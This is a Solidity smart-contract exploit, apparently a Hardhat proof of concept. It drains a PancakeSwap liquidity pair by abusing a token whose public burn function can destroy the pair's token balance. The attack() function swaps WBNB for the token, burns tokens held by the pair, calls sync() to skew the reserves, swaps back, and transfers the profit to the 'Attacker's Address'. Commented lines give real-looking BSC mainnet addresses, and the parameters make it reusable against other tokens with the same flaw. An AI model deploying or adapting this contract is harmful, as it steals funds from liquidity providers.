//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

import "hardhat/console.sol";
import "./interfaces/PancakeSwap/IERC20.sol";
import "./interfaces/PancakeSwap/IPancakeRouter01.sol";
import "./interfaces/PancakeSwap/IPancakeRouter02.sol";
import "./interfaces/PancakeSwap/IPancakePair.sol";
import "./interfaces/PancakeSwap/IWETH.sol";

interface VULNERABLE_IERC20 is IERC20 {
    function burn(address account, uint256 amount) external;
}

struct Options{
    uint256 swapAmount;
    uint256 burnAmount;
    uint8 numberOfSwapOperations;
    uint8 numberOfBurnOperations;
}

struct Addresses{
    address pair;
    address router;
    address vulnerableToken;
    address wbnb;
}

struct Input{
    Options options;
    Addresses addresses;
}

contract Exploit {

    // address PAIR = 0x02b0551B656509754285eeC81eE894338E14C5DD;
    // address ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    // address VULNERABLE_TOKEN = 0xF40d33DE6737367A1cCB0cE6a056698D993A17E1;
    // address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;

    address PAIR;
    address ROUTER;
    address VULNERABLE_TOKEN;
    address WBNB;


    IPancakePair pair;
    IPancakeRouter02 router;
    VULNERABLE_IERC20 vulnerableToken;
    IWETH wbnb;

    address deployer;

    // Parameters
    uint256 swapAmount;
    uint256 burnAmount;
    uint8 numberOfSwapOperations;
    uint8 numberOfBurnOperations;
    

    // constructor(address Pair, address Router, address Vulnerable_Token, address Wbnb
    // , uint256 Swap_Amount, uint256 Burn_Amount
    // , uint8 Swap_Operations,uint8 Burn_Operations){
    constructor(Input memory input){
        deployer = msg.sender;
        PAIR = input.addresses.pair;
        ROUTER = input.addresses.router;
        VULNERABLE_TOKEN = input.addresses.vulnerableToken;
        WBNB = input.addresses.wbnb;

        swapAmount = input.options.swapAmount;
        burnAmount = input.options.burnAmount;

        numberOfSwapOperations = input.options.numberOfSwapOperations;
        numberOfBurnOperations = input.options.numberOfBurnOperations;
         
        pair = IPancakePair(PAIR);
        router = IPancakeRouter02(ROUTER);
        vulnerableToken = VULNERABLE_IERC20(VULNERABLE_TOKEN);
        wbnb = IWETH(WBNB);
    }

    function attack() public payable{

        wbnb.deposit{value: msg.value}();
        console.log("-----------------------------------------------");
        console.log("INFO:");
        console.log("ROUTER address: ", ROUTER);
        console.log("PAIR address: ", PAIR);
        console.log("VULNERABLE TOKEN address: ", VULNERABLE_TOKEN);
        console.log("WBNB address: ", WBNB);
        
        console.log("-----------------------------------------------");
        console.log("Inital Balance Of WBNB: ", IERC20(WBNB).balanceOf(address(this)));
        
        console.log("-----------------------------------------------");
        console.log("Begin Test: ");
        vulnerableToken.approve(ROUTER, type(uint256).max);
        IERC20(WBNB).approve(ROUTER, type(uint256).max);
        
        address [] memory path_WBNB_to_vulnerableToken = new address [] (2);
        path_WBNB_to_vulnerableToken[0]=WBNB; 
        path_WBNB_to_vulnerableToken[1]=VULNERABLE_TOKEN;
        
        console.log("-----------------------------------------------");
        console.log("Swap WBNB to VULNERABLE TOKEN");
        console.log("Number of Times: ", numberOfSwapOperations);
        console.log("Swap Amount: ", swapAmount);
        for (uint8 i = 0; i < numberOfSwapOperations; i++) {
            uint256 amountIn = router.getAmountsIn(swapAmount, path_WBNB_to_vulnerableToken)[0];
            router.swapExactTokensForTokensSupportingFeeOnTransferTokens(amountIn, 0, path_WBNB_to_vulnerableToken, address(this), block.timestamp+100);
        }
        console.log("Swap Succeed");
        console.log("Balance of VULNERABLE TOKEN: ", vulnerableToken.balanceOf(address(this)));
        console.log("Balance of WBNB: ", IERC20(WBNB).balanceOf(address(this)));
        console.log("Balance of VULNERABLE TOKEN in PAIR: ", IERC20(vulnerableToken).balanceOf(PAIR));
        console.log("-----------------------------------------------");


        console.log("Attempt to Burn the Vulnerable Token in PAIR");
        console.log("Number of Times: ", numberOfBurnOperations);
        console.log("Burn Amount: ", burnAmount);
        for (uint8 i = 0; i < numberOfBurnOperations; i++) {
            vulnerableToken.burn(PAIR, burnAmount);
        }
        console.log("Completed burning");
        console.log("-----------------------------------------------");

        pair.sync();
       
        console.log("Swap Back WBNB");
        address [] memory path_vulnerableToken_to_WBNB = new address [] (2);
        path_vulnerableToken_to_WBNB[0]=VULNERABLE_TOKEN;
        path_vulnerableToken_to_WBNB[1]=WBNB; 
        
        for (uint8 i = 0; i < numberOfSwapOperations; i++) {
            router.swapExactTokensForTokens(swapAmount, 0, path_vulnerableToken_to_WBNB, address(this), block.timestamp+1000);
        }
        console.log("Swap Back Succeed");
        console.log("Balance of VULNERABLE TOKEN: ", vulnerableToken.balanceOf(address(this)));
        console.log("Balance of WBNB: ", IERC20(WBNB).balanceOf(address(this)));
        console.log("Profits: ", IERC20(WBNB).balanceOf(address(this)) - 500 ether);
        console.log("Transfer Profits to Attacker's Address");
        wbnb.transfer(msg.sender, IERC20(WBNB).balanceOf(address(this)) - 500 ether);
        console.log("-----------------------------------------------");
        console.log("End of Test");
        console.log("-----------------------------------------------");
    }    
}
